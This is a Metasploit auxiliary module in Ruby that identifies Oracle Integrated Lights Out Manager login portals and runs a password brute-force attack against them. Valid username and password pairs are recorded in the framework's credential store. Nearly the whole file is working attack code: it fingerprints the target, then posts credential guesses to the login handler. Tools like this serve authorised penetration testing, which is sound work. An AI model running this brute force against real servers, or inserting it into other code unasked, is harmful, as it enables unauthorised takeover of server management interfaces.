##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Oracle ILO Manager Login Brute Force Utility',
      'Description'    => %{
        This module scans for Oracle Integrated Lights Out Manager (ILO) login portal, and
        performs a login brute force attack to identify valid credentials.
      },
      'Author'         =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
        ],
      'License'        => MSF_LICENSE,

      'DefaultOptions' => { 'SSL' => true }
  ))

    register_options(
      [
        Opt::RPORT(443)
      ])
  end

  def run_host(ip)
    unless is_app_oilom?
      return
    end

    print_status("Starting login brute force...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  #
  # What's the point of running this module if the target actually isn't Oracle ILOM
  #

  def is_app_oilom?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/iPages/i_login.asp',
        'method'    => 'GET'
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      vprint_error("HTTP Connection Failed...")
      return false
    end

    if (res and res.code == 200 and res.headers['Server'].include?("Oracle-ILOM-Web-Server") and res.body.include?("Integrated Lights Out Manager"))
      vprint_good("Running Oracle Integrated Lights Out Manager portal...")
      return true
    else
      vprint_error("Application is not Oracle ILOM. Module will not continue.")
      return false
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
      {
        'uri'       => '/iPages/loginProcessor.asp',
        'method'    => 'POST',
        'vars_post' =>
          {
            'sclink' => '',
            'username' => user,
            'password' => pass,
            'button' => 'Log+In'
          }
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("HTTP Connection Failed...")
      return :abort
    end

    if (res and res.code == 200 and res.body.include?("/iPages/suntab.asp") and res.body.include?("SetWebSessionString"))
      print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'Oracle Integrated Lights Out Manager Portal',
        user: user,
        password: pass,
        proof: res.body
      )
      return :next_user
    else
      vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
    end

  end
end
